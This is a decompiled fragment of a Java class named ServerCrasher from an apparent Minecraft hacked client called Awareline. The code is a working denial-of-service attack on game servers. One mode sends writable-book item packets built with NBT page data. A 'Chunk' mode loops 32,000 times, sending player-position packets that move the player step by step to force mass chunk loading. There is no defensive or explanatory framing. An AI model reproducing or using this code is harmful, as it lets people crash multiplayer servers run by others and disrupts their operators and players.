/* 239 */           nBTTagCompound.setTag("pages", (NBTBase)nBTTagList);
/* 240 */           ItemStack itemStack = new ItemStack(Items.writable_book);
/* 241 */           itemStack.setTagCompound(nBTTagCompound);
/* 242 */           sendPacketNoEvent((Packet)new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), 2, itemStack, 0.0F, 0.0F, 0.0F));
/*     */         } 
/* 244 */         this.delay.reset();
/*     */       } 
/* 246 */     } else if (this.mode.is("Chunk")) {
/*     */ 
/*     */ 
/*     */       
/* 250 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 251 */         double x = mc.thePlayer.posX;
/* 252 */         double d1 = mc.thePlayer.posY;
/* 253 */         double z = mc.thePlayer.posZ;
/* 254 */         for (int i1 = 0; i1 < 32000; i1++) {
/* 255 */           sendPacketNoEvent((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x++, (d1 >= 255.0D) ? 255.0D : d1++, z++, true));
/*     */         }
/* 257 */         this.delay.reset();
/*     */       } 
/*     */     } 
/*     */   }
/*     */ }


/* Location:              C:\Users\Administrator\Downloads\Awareline - NextGen7 release ‎2023‎-12-25-‏11-09-05.jar!\awareline\main\mod\implement\misc\server\ServerCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */